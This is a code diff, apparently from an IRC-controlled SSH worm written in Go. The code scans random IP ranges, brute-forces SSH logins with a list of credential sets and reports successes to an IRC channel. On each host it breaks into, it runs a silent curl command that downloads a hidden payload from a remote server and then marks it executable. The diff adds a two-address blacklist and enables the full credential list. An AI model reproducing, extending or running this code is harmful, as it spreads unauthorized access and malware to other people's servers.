@@ -49,7 +49,7 @@ func ManageIP_range(mainRange, setRange string) string {
 	ipGen = append(ipGen, setRange, ".")
 
 	for i := 0; i < 2; i++ {
-		ipGen = append(ipGen, GenRange(255, 0), ".")
+		ipGen = append(ipGen, GenRange(5, 1), ".")
 	}
 
 	ipGen[len(ipGen)-1] = ""
@@ -114,13 +114,13 @@ func SSH_Session(ssh_session *ssh.Client, command string) {
 	var set_session bytes.Buffer
 	session.Stdout = &set_session
 	session.Run(command)
+	session.Close()
 }
 
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
-		//chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
-		//cgpn4, cgpn5, cgpn6, priv,
-		priv,
+		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
+		cgpn4, cgpn5, cgpn6, priv,
 	}
 
 	/*
@@ -145,6 +145,13 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			ptrTarget := &target
 			turnRange := CheckPort(*ptrTarget)
 
+			//Blacklist IP.
+			if target == "192.168.1.1:22" || target == "192.168.1.16:22" {
+				break
+			}
+
+			fmt.Println(target)
+
 			if turnRange == "" {
 				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+target+" SSH not found.")
 				CheckPort(target)
@@ -158,8 +165,10 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 						if err == nil {
 							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+"Login success at "+turnRange)
 							SSH_Session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
-							time.Sleep(30 * time.Second)
-							SSH_Session(_session, "./."+set_payload+" "+"&")
+							time.Sleep(10 * time.Second)
+							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+turnRange+" Already get The payload.")
+							SSH_Session(_session, "chmod +x ."+set_payload)
+							//SSH_Session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
